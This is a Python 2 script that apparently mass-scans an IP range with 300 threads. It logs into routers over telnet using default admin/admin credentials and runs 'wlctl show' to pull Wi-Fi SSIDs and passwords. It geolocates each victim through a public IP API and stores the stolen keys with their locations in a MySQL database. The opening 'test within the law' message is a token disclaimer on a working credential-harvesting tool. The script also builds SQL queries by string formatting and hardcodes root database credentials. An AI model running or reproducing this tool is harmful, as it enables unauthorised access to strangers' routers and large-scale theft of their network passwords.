#!/usr/bin/env python
# -*- coding:utf-8 -*-

import Queue
from threading import Thread
import telnetlib
import time
import re
import subprocess
import MySQLdb
import urllib2
import json
import urllib

class Database:
    host = '127.0.0.1'
    user = 'root'
    password = 'root'
    db = 'ttlwifi'
    charset = 'utf8'

    def __init__(self):
        self.connection = MySQLdb.connect(self.host, self.user, self.password, self.db,charset=self.charset)
        self.cursor = self.connection.cursor()

    def insert(self, query):
        try:
            self.cursor.execute(query)
            self.connection.commit()
        except:
            self.connection.rollback()

    def query(self, query):
        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute(query)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()

#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,
                            (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8,
                            num & 0x000000ff)

#get all ips list between start ip and end ip
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#main function
def bThread(iplist):
    threadl = []
    threads = 300
    queue = Queue.Queue()
    hosts = iplist
    for host in hosts:
        queue.put(host)

    threadl = [tThread(queue) for x in xrange(0, threads)]
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#get host position by Taobao API
def getposition(host):
    try:
        ipurl = "http://ip.taobao.com/service/getIpInfo.php?ip="+host
        jsondata = urllib2.urlopen(ipurl).read()
        value = json.loads(jsondata)['data']
        info = [value['country'],value['region'],value['city'],value['isp'] ]
        return info
    except Exception, e:
        print "Get "+ host+" position failed , will retry ...\n"
        getposition(host)
#create thread
class tThread(Thread):
    username = "admin"
    password = "admin"
    TIMEOUT = 15

    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                #print host
                data = self.telnet(host)
            except:
                continue

    def telnet(self, host):
        #print host
        t = telnetlib.Telnet(host, timeout=self.TIMEOUT)
        t.read_until("username:", self.TIMEOUT)
        t.write(self.username + "\n")
        t.read_until("password:", self.TIMEOUT)
        t.write(self.password + "\n")
        t.write("wlctl show\n")
        t.read_until("SSID", self.TIMEOUT)
        str = t.read_very_eager()
        t.close()

        str = "".join(str.split())
        SID = str[1:str.find('QSS')]
        KEY = str[str.find('Key=') + 4:str.find('cmd')] if str.find('Key=') != -1 else ''
        if SID != '':
            currentTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            try:
                print '[Get] '+currentTime +'  ' +host +'  '+ SID +'  ' + KEY
                ipinfo = getposition(host)
                mysql = Database()
                queryStr = "SELECT id FROM keydata where password='%s' and ssid='%s'" % (KEY,SID)
                ifexsit = len(mysql.query(queryStr))
                if ifexsit<1:
                    try:
                        mysql.insert("INSERT INTO keydata(ip, ssid, password, createtime,country,province,city,isp) VALUES('%s', '%s', '%s', '%s','%s','%s','%s','%s')" % (host, SID.encode('utf8'), KEY,currentTime,ipinfo[0],ipinfo[1],ipinfo[2],ipinfo[3]))
                        print '\033[1;33mInsert '+ SID +' into database success !\033[0m\n'
                    except Exception as e:
                        print 'Save '+ SID +' failed , will resave ...... \n'
                        bThread([host])
                else:
                    print '\033[1;31mFound '+ SID +' in database !\033[0m\n'
            except Exception as e:
                print e
                exit(1)

if __name__ == '__main__':
    print 'Just make a test in the extent permitted by law  (^_^)'
    #重启mysql服务
    print "Restart mysql service ..."
    stratMysqlCMD = ["net","start","mysql"]
    mysqlStratPro = subprocess.Popen(stratMysqlCMD,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    mysqlStratRes = mysqlStratPro.communicate()
    mysqlStratPro.wait()
    startMysqlExt = re.findall(r'failed',mysqlStratRes[0])
    #检查启动mysql是否成功
    if len(startMysqlExt)>0 :
        print '\033[1;31m[Failed]\033[0m Can not start mysql service, please check!'
        exit(1)
    else:
        print '\033[1;33m[Success]\033[0m Mysql service is running ...'
    print "----------------------------------------------------------------"
    startIp = raw_input('Start IP：')
    endIp = raw_input('End IP：')
    iplist = ip_range(startIp, endIp)
    print '\nTotal '+str(len(iplist))+" IP...\n"
    bThread(iplist)
